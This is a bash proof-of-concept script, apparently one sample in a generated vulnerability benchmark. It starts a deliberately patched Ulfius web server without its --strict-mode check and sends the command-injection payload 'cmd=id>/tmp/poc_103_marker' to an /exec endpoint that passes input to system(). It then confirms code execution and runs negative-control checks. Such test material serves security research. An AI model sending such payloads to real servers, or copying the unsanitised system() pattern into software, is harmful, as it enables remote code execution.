#!/usr/bin/env bash
# PoC for 103_ulfius_C2I1S3
# Axes: C2 (two CLI flags + struct) / I1 (direct to system()) / S3 (flag-gated sanitization)
#
# Usage: ./PoC.sh
# Expected: prints uid= line confirming RCE as the server process user.
#
# S3 bypass: start server WITH --enable-exec --enable-diag but WITHOUT --strict-mode.
# Without --strict-mode, the has_injection() check is never called, so any
# character including shell metacharacters passes directly to system().
#
# The patched binary (ulfius_server) lives in this directory. If it is absent,
# run:  cd $(dirname $0) && bash build.sh

set -euo pipefail

SAMPLE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BINARY="$SAMPLE_DIR/ulfius_server"
WWWROOT="/tmp/poc_103_www"
MARKER="/tmp/poc_103_marker"
PORT=18103

if [[ ! -x "$BINARY" ]]; then
    echo "[-] binary not found at $BINARY — run build.sh first" >&2
    exit 1
fi

SERVER_PID=0

cleanup() {
    [[ $SERVER_PID -ne 0 ]] && { kill "$SERVER_PID" 2>/dev/null || true; wait "$SERVER_PID" 2>/dev/null || true; }
    rm -rf "$WWWROOT" "$MARKER"
}
trap cleanup EXIT

mkdir -p "$WWWROOT"

# ── start server WITH both C2 gates, WITHOUT --strict-mode (S3 bypass) ─────────
echo "[*] starting ulfius_server with --enable-exec --enable-diag (no --strict-mode) on port $PORT..."
"$BINARY" --port "$PORT" --enable-exec --enable-diag &
SERVER_PID=$!
sleep 0.4

# ── trigger: shell metachar > in cmd param ─────────────────────────────────────
echo "[*] sending payload: cmd=id>$MARKER"
curl -sf "http://127.0.0.1:${PORT}/exec?cmd=id>${MARKER}" > /dev/null

# ── verify ─────────────────────────────────────────────────────────────────────
if [[ -f "$MARKER" ]]; then
    echo "[+] RCE confirmed. Server executed:"
    cat "$MARKER"
else
    echo "[-] marker file not found — exploit failed"
    exit 1
fi

# ── negative control: endpoint returns 403 with only one flag ──────────────────
echo "[*] verifying gate: endpoint must return 403 with only --enable-exec..."
NEG_PORT=19103
"$BINARY" --port "$NEG_PORT" --enable-exec &
NEG_PID=$!
sleep 0.4
HTTP_CODE=$(curl -sf -o /dev/null -w "%{http_code}" \
    "http://127.0.0.1:${NEG_PORT}/exec?cmd=id" || true)
kill "$NEG_PID" 2>/dev/null; wait "$NEG_PID" 2>/dev/null || true
if [[ "$HTTP_CODE" == "403" ]]; then
    echo "[+] gate check passed: got 403 with only one C2 flag"
else
    echo "[!] gate check unexpected response: $HTTP_CODE"
fi

# ── S3 demonstration: --strict-mode blocks injection characters ────────────────
echo "[*] verifying S3: --strict-mode blocks shell metacharacters..."
STRICT_PORT=19104
"$BINARY" --port "$STRICT_PORT" --enable-exec --enable-diag --strict-mode &
STRICT_PID=$!
sleep 0.4
STRICT_CODE=$(curl -sf -o /dev/null -w "%{http_code}" \
    "http://127.0.0.1:${STRICT_PORT}/exec?cmd=id>${MARKER}" || true)
kill "$STRICT_PID" 2>/dev/null; wait "$STRICT_PID" 2>/dev/null || true
if [[ "$STRICT_CODE" == "400" ]]; then
    echo "[+] S3 check passed: got 400 with --strict-mode (injection chars blocked)"
else
    echo "[!] S3 check unexpected response: $STRICT_CODE"
fi
